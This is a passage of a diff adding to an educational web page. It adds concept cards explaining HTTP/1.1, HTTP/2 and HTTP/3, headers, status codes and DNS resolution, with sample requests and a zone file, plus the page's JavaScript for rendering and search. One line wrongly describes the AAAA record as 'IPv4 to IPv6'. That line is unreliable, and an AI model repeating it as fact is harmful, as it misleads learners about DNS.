+    explanation: `<p><strong>HTTP (Hypertext Transfer Protocol)</strong> is an application-layer, request-response protocol running over TCP (HTTP/1.x, HTTP/2) or QUIC (HTTP/3). Every interaction between browser and server is an HTTP exchange. Understanding it deeply makes you a better debugger, API designer, and performance engineer.</p>
+    <p><strong>HTTP/1.1</strong>: text-based, one request per connection (with keep-alive reuse). Browsers open 6 parallel connections per origin to work around this. <strong>Head-of-line blocking</strong>: a stalled request blocks all subsequent requests in that connection.</p>
+    <p><strong>HTTP/2</strong>: binary-framed, multiplexed (multiple requests over one connection simultaneously — no HOL blocking at HTTP layer), header compression (HPACK), optional server push. This is why HTTP/2 is faster: one connection replaces 6, headers are compressed, and requests don't block each other.</p>
+    <p><strong>HTTP/3</strong>: runs over <strong>QUIC</strong> instead of TCP. QUIC is UDP-based, implements its own reliable delivery, and crucially eliminates HOL blocking at the transport layer (TCP HOL blocking affects all streams in HTTP/2 — a lost packet stalls everything). HTTP/3 also has 0-RTT connection establishment — returning visitors reconnect without any handshake round-trips.</p>
+    <div class="highlight"><strong>Important headers every developer must know:</strong> <code>Content-Type</code> (what the body is — MIME type), <code>Authorization</code> (credentials/token), <code>Cache-Control</code> (caching directives), <code>CORS headers</code> (cross-origin access), <code>X-Request-Id</code> (distributed tracing), <code>Retry-After</code> (rate limiting), <code>Location</code> (redirect target), <code>ETag</code> (conditional requests), <code>Accept-Encoding / Content-Encoding</code> (gzip/br compression).</div>
+    <p><strong>Status code groups:</strong> 1xx informational, 2xx success (200 OK, 201 Created, 204 No Content), 3xx redirect (301 permanent, 302 temporary, 304 not modified), 4xx client error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 409 Conflict, 422 Unprocessable, 429 Rate Limited), 5xx server error (500, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout).</p>`,
+    usecases: [
+      { where: 'Debugging API issues in the browser', desc: 'Browser DevTools Network tab shows every HTTP request: URL, method, status code, headers (request + response), timing (TTFB, content download). A 401 means the auth token is missing/expired. A 503 means the backend is down. CORS errors show up here first. This is the primary debugging tool for any web developer.' },
+      { where: 'Optimizing API performance with HTTP/2', desc: 'An API client making 10 requests concurrently over HTTP/1.1 uses 6 connections (browser limit) — 4 requests must wait. Over HTTP/2, all 10 go out simultaneously on one connection. A multiplexed gRPC stream is even better — bidirectional streaming over a single HTTP/2 connection.' },
+      { where: 'CDN configuration and caching headers', desc: 'A marketing page sets <code>Cache-Control: public, max-age=3600, s-maxage=86400</code>: browsers cache for 1 hour, CDN (s-maxage) caches for 24 hours. After a content update, the team calls <code>cloudflare.zones.purgeFiles()</code> to invalidate CDN cache. Static assets get <code>immutable, max-age=31536000</code>.' },
+      { where: 'Load balancer health checks', desc: 'AWS ALB sends HTTP GET requests to <code>/health</code> on each backend every 30 seconds. If a backend returns non-200 or times out, ALB removes it from the target group. The backend returns 200 when healthy, 503 when it\'s shutting down (draining connections). This enables zero-downtime deployments.' },
+    ],
+    code: `<span class="cm">// HTTP request anatomy</span>
+<span class="cm">// Request:</span>
+<span class="kw">GET</span> /api/users?page=2 HTTP/<span class="num">2</span>
+Host: api.example.com
+Authorization: Bearer eyJ...
+Accept: application/json
+Accept-Encoding: gzip, br
+X-Request-Id: uuid-here
+
+<span class="cm">// Response:</span>
+HTTP/<span class="num">2</span> <span class="num">200</span> OK
+Content-Type: application/json; charset=utf-8
+Cache-Control: private, max-age=<span class="num">60</span>
+ETag: <span class="str">"abc123"</span>
+X-RateLimit-Remaining: <span class="num">99</span>
+Content-Encoding: gzip
+
+{ <span class="str">"data"</span>: [...], <span class="str">"nextCursor"</span>: <span class="str">"..."</span> }
+
+<span class="cm">// Conditional request: only fetch if changed</span>
+<span class="kw">GET</span> /api/config HTTP/<span class="num">2</span>
+If-None-Match: <span class="str">"abc123"</span>
+<span class="cm">// → 304 Not Modified (no body!) if unchanged</span>
+<span class="cm">// → 200 with new body if changed</span>`,
+    tags: ['HTTP/1.1', 'HTTP/2', 'HTTP/3', 'QUIC', 'Headers', 'Status Codes', 'TLS', 'CDN', 'Cache-Control']
+  },
+  {
+    title: 'DNS — How Domain Names Actually Work',
+    badge: 'Infrastructure', color: 'red',
+    tagline: 'The distributed phone book of the internet — and how a name becomes an IP address.',
+    explanation: `<p>DNS (Domain Name System) is a globally distributed, hierarchical database that translates human-readable names (<code>api.example.com</code>) to IP addresses. It's the foundation of everything — before any HTTP request, DNS must resolve. A DNS failure means your service is unreachable even if servers are healthy.</p>
+    <p><strong>The resolution journey:</strong> (1) Browser checks its DNS cache (respects TTL). (2) OS checks its cache + <code>/etc/hosts</code>. (3) OS sends query to the configured <strong>recursive resolver</strong> (your ISP's resolver, or 8.8.8.8 Google, 1.1.1.1 Cloudflare). (4) Recursive resolver checks its cache. On miss: (5) Queries a <strong>root nameserver</strong> (13 root nameserver clusters): "who handles .com?" (6) Queries the <strong>TLD nameserver</strong> (.com): "who handles example.com?" (7) Queries example.com's <strong>authoritative nameserver</strong> (Route 53, Cloudflare DNS): "what is api.example.com?" (8) Returns the A record IP. Recursive resolver caches the result for TTL seconds.</p>
+    <p><strong>DNS record types:</strong> <strong>A</strong>: maps name to IPv4 address. <strong>AAAA</strong>: IPv4 to IPv6. <strong>CNAME</strong>: alias one name to another name (cannot be used at zone apex — <code>example.com</code> itself). <strong>MX</strong>: mail server routing. <strong>TXT</strong>: arbitrary text — used for domain verification (Google, AWS), SPF records (spam prevention), DKIM keys. <strong>NS</strong>: which servers are authoritative for this zone. <strong>SOA</strong>: zone metadata. <strong>SRV</strong>: service discovery (port + host). <strong>CAA</strong>: which CAs can issue certs for this domain.</p>
+    <div class="highlight"><strong>TTL is the lever that controls change propagation time:</strong> A TTL of 3600 (1 hour) means it takes up to 1 hour for a DNS change to propagate globally (old TTL value cached at resolvers). Best practice: lower TTL to 60s before a planned DNS change, make the change, then raise TTL back after confirming. Never change DNS with a high TTL and wonder why it hasn't propagated.</div>`,
+    usecases: [
+      { where: 'Blue/Green deployment via DNS failover', desc: 'Two environments: blue (current) and green (new). DNS A record points to blue. After deploying and verifying green: update A record to point to green. With a 60s TTL, traffic shifts within a minute. Rollback = flip DNS back. Route 53 health-checks auto-failover if the primary endpoint goes unhealthy.' },
+      { where: 'Custom domain for SaaS (CNAME-based)', desc: 'A customer wants their app at <code>app.theircorp.com</code>. They add a CNAME: <code>app.theircorp.com → yourplatform.io</code>. Your platform reads the <code>Host</code> header on incoming requests and routes to the correct tenant. Wildcard TLS cert or ACME-provisioned cert per domain handles HTTPS.' },
+      { where: 'Service discovery in microservices', desc: 'Kubernetes uses CoreDNS for internal service discovery. A service named <code>payment-service</code> in namespace <code>prod</code> is reachable at <code>payment-service.prod.svc.cluster.local</code>. Any pod can resolve this name to the service\'s ClusterIP. No hardcoded IPs — all done through DNS.' },
+      { where: 'Email security (SPF, DKIM, DMARC)', desc: 'SPF TXT record lists authorized sending IPs: <code>"v=spf1 include:sendgrid.net ~all"</code>. DKIM TXT record contains the public key for signing validation. DMARC TXT record defines what to do with failed SPF/DKIM checks (reject, quarantine, report). All of these live in DNS and are how email providers decide if your email is spam.' },
+    ],
+    code: `<span class="cm">; DNS Zone file for example.com</span>
+<span class="cm">; A record: name → IPv4</span>
+api     A       203.0.113.10
+www     A       203.0.113.10
+
+<span class="cm">; AAAA record: name → IPv6</span>
+api     AAAA    2001:db8::1
+
+<span class="cm">; CNAME: alias (not at apex!)</span>
+blog    CNAME   myblog.substack.com.
+
+<span class="cm">; MX: mail routing (priority 10 = preferred)</span>
+@       MX  10  mail1.example.com.
+@       MX  20  mail2.example.com.  <span class="cm">; fallback</span>
+
+<span class="cm">; TXT: SPF (authorize sendgrid to send email)</span>
+@       TXT     "v=spf1 include:sendgrid.net -all"
+
+<span class="cm">; CAA: only Let's Encrypt can issue certs</span>
+@       CAA     0 issue "letsencrypt.org"
+
+<span class="cm">; Check DNS propagation:</span>
+<span class="cm">; dig api.example.com @8.8.8.8  (query Google's resolver)</span>
+<span class="cm">; nslookup api.example.com 1.1.1.1</span>`,
+    tags: ['DNS', 'A Record', 'CNAME', 'MX', 'TXT', 'TTL', 'Route 53', 'SPF', 'DKIM', 'Cloudflare']
+  },
+],
+};
+
+// ═══════════════════════════════════════════════════════════
+// RENDER
+// ═══════════════════════════════════════════════════════════
+
+function renderSection(secId, items) {
+  const list = document.getElementById(secId + '-list');
+  document.getElementById('n-' + secId).textContent = items.length;
+
+  list.innerHTML = items.map((item, idx) => {
+    const v = item.color || 'red';
+    return `
+    <article class="concept v-${v}" id="${secId}-${idx}" data-search="${
+      [item.title, item.badge, item.tagline, item.explanation, ...(item.tags||[]),
+       ...(item.usecases||[]).map(u => u.where + ' ' + u.desc)].join(' ').toLowerCase()
+    }">
+      <div class="concept-header" onclick="toggleConcept(this)">
+        <div class="concept-meta">
+          <div class="concept-title-row">
+            <span class="concept-title">${item.title}</span>
+            <span class="concept-badge badge-${v}">${item.badge}</span>
+          </div>
+          <p class="concept-tagline">${item.tagline}</p>
+        </div>
+        <div class="concept-toggle">+</div>
+      </div>
+
+      <div class="concept-body">
+        <div class="concept-body-inner">
+          <div class="explanation">
+            <div class="col-label">Detailed Explanation</div>
+            ${item.explanation}
+          </div>
+          <div class="use-cases">
+            <div class="col-label">Practical Use Cases</div>
+            ${(item.usecases||[]).map(uc => `
+              <div class="use-case">
+                <div class="uc-where">${uc.where}</div>
+                <p class="uc-desc">${uc.desc}</p>
+              </div>
+            `).join('')}
+          </div>
+          ${item.code ? `
+          <div class="code-section">
+            <div class="col-label">Code Example</div>
+            <div class="code-block">${item.code}</div>
+          </div>` : ''}
+        </div>
+        ${item.tags ? `
+        <div class="tags-row">
+          ${item.tags.map(t => `<span class="tag">${t}</span>`).join('')}
+        </div>` : ''}
+      </div>
+    </article>`;
+  }).join('');
+}
+
+function toggleConcept(header) {
+  const concept = header.closest('.concept');
+  const isOpen = concept.classList.contains('open');
+  concept.classList.toggle('open', !isOpen);
+  header.querySelector('.concept-toggle').textContent = isOpen ? '+' : '−';
+  if (!isOpen) {
+    setTimeout(() => concept.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 50);
+  }
+}
+
+function doSearch(input, secId) {
+  const q = input.value.toLowerCase().trim();
+  const list = document.getElementById(secId + '-list');
+  const items = list.querySelectorAll('.concept');
+  let visible = 0;
+
+  items.forEach(item => {
+    const match = !q || item.dataset.search.includes(q);
+    item.style.display = match ? '' : 'none';
+    if (match) visible++;
+  });
+
+  const rc = document.getElementById('rc-' + secId);
+  rc.textContent = q ? `${visible} result${visible !== 1 ? 's' : ''} for "${q}"` : '';
+
+  // auto-open single result
+  if (visible === 1 && q) {
+    const only = [...items].find(i => i.style.display !== 'none');
+    if (only && !only.classList.contains('open')) {
+      only.querySelector('.concept-header').click();
+    }
+  }
+}
+
+// Build sidebar TOC for active section
+function buildToc(secId) {
+  const toc = document.getElementById('toc');
+  const items = DATA[secId] || [];
+  toc.innerHTML = items.map((item, idx) =>
+    `<span class="toc-item" onclick="jumpTo('${secId}-${idx}')">${item.title}</span>`
+  ).join('');
+}
+
+function jumpTo(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  if (!el.classList.contains('open')) {
+    el.querySelector('.concept-header').click();
+  }
+}
+
+// Tab switching
+document.getElementById('main-nav').addEventListener('click', e => {
+  const tab = e.target.closest('.ntab');
+  if (!tab) return;
+  const secId = tab.dataset.sec;
+  document.querySelectorAll('.ntab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  tab.classList.add('active');
+  document.getElementById(secId).classList.add('active');
+  buildToc(secId);
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+});
+
+// Init
+Object.keys(DATA).forEach(secId => renderSection(secId, DATA[secId]));
+
+const total = Object.values(DATA).reduce((a, b) => a + b.length, 0);
+document.getElementById('total-count').textContent = total;
+
+buildToc('frontend');
+</script>
+</body>
+</html>
